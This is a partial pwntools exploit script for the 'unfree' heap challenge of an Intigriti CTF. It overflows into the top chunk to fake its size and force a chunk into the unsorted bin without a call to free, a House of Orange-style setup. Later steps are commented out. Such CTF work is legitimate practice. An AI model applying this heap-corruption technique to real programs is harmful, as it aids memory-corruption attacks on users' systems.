from pwn import *

gs = """
continue
"""

context.binary = elf = ELF("./unfree_patched")
#context.log_level = 'debug'

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def create(index, size, data):

    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"1")

    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()

    io.sendline(str(size).encode())
    io.recvline()

    io.send(data)

def edit(index, data):
    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"2")

    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()

    io.send(data)

def view(index):

    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"3")

    io.recvline()
    io.sendline(str(index).encode())

    return io.recvline()


context.terminal = ['gnome-terminal', '-e']
io = start()

create(0, 0x500, b"A")
create(18, 0x328, b"M"*0x328 + p64(0x531)) # Sobrescritura de top chunk por 0x531
create(1, 0x580, b'XXXX') # 0x580 > 0x531 lo cual provocara el free sin hacer el free, pero lo guardara en unsorted bins

#create(2, 0x548, b'B'*0x548 + p64(0x521))
#create(3, 0x560, b"PAD")
#create(4, 0x580, b"MAGO")
#create(5, 0x500, b"\xe0")


io.interactive()
